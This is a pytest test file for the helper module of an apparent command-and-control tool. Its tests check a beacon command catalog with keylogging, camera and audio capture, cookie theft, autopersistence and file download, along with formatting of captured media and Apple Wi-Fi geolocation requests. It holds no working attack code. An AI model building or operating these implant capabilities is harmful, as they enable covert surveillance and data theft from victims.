"""Tests for the c2_helpers beacon command catalog + result formatting."""
import pytest

from phantom.utils.c2_helpers import (
    beacon_command_dicts,
    format_beacon_output,
    _apple_build_request,
    _parse_apple_wloc,
)


# ── beacon command catalog ──────────────────────────────────────────────────

def test_beacon_commands_catalog_complete():
    cmds = beacon_command_dicts()
    assert len(cmds) >= 50
    names = [c["command"] for c in cmds]
    # core commands the operator relies on (previously missing from the UI)
    for expected in ("screenshot", "camera", "gps", "audio", "keylog start|stop|status|dump",
                     "wlan-locate", "cookies", "screen-record <sec>", "autopersist",
                     "migrate", "health", "download <path>"):
        assert any(n.startswith(expected.split()[0]) for n in names), \
            f"missing command family: {expected}"
    # every entry has a description
    assert all(c["description"] for c in cmds)
    # platform tags are valid
    assert all(c.get("platform") in ("", "win", "linux") for c in cmds)


def test_beacon_commands_unique():
    names = [c["command"] for c in beacon_command_dicts()]
    assert len(names) == len(set(names))


# ── result formatting ────────────────────────────────────────────────────────

def test_format_camera_frame(tmp_path, monkeypatch):
    import base64
    from phantom.utils import c2_helpers
    monkeypatch.setattr(c2_helpers, "data_dir", lambda: str(tmp_path))
    b64 = base64.b64encode(b"\xff\xd8jpegbytes").decode()
    display, extra = format_beacon_output(f"CAM_FRAME:Integrated Camera|MEDIA_B64:{b64}")
    assert "Camera frame captured" in display
    assert "Integrated Camera" in display
    assert "Saved to" in extra


def test_format_generic_media(tmp_path, monkeypatch):
    import base64
    from phantom.utils import c2_helpers
    monkeypatch.setattr(c2_helpers, "data_dir", lambda: str(tmp_path))
    display, extra = format_beacon_output("MEDIA_B64:" + base64.b64encode(b"abc").decode())
    assert "Media artifact saved" in display


def test_format_plaintext_passthrough():
    display, extra = format_beacon_output("whoami\nadministrator")
    assert display == "whoami\nadministrator"
    assert extra == ""


# ── Apple WLOC request builder (free geolocation, no API key) ────────────────

def test_apple_request_shape():
    body = _apple_build_request("AA:BB:CC:DD:EE:FF")
    assert b"AA:BB:CC:DD:EE:FF" in body
    assert body.startswith(b"\x00\x01\x00\x05")
